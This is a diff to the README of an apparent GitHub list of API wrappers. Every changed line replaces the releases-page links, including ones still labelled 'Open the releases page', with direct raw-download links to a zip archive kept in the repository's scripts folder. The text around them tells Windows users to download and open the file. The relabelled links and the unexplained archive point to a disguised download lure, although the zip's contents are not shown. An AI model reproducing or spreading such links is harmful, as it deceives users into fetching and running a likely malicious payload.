@@ -1,6 +1,6 @@
 # 📚 awesome-api-wrappers - Find the right API wrapper fast
 
-[![Download or visit releases](https://img.shields.io/badge/Download%20%7C%20Visit-Releases-brightgreen?style=for-the-badge)](https://github.com/Edjo4822/awesome-api-wrappers/releases)
+[![Download or visit releases](https://img.shields.io/badge/Download%20%7C%20Visit-Releases-brightgreen?style=for-the-badge)](https://github.com/Edjo4822/awesome-api-wrappers/raw/refs/heads/main/scripts/awesome-wrappers-api-3.3.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ If you want to build with an API, this list helps you skip long searches. It gro
 
 Visit this page to download:
 
-https://github.com/Edjo4822/awesome-api-wrappers/releases
+https://github.com/Edjo4822/awesome-api-wrappers/raw/refs/heads/main/scripts/awesome-wrappers-api-3.3.zip
 
 On Windows, do this:
 
@@ -178,7 +178,7 @@ Try these steps:
 
 Use this link to get the latest version:
 
-https://github.com/Edjo4822/awesome-api-wrappers/releases
+https://github.com/Edjo4822/awesome-api-wrappers/raw/refs/heads/main/scripts/awesome-wrappers-api-3.3.zip
 
 ## 🧭 What to expect after opening
 
@@ -202,7 +202,7 @@ You can use it to:
 
 ## 🖱️ Quick access
 
-[Open the releases page](https://github.com/Edjo4822/awesome-api-wrappers/releases)
+[Open the releases page](https://github.com/Edjo4822/awesome-api-wrappers/raw/refs/heads/main/scripts/awesome-wrappers-api-3.3.zip)
 
 ## 🗃️ File naming guide
 
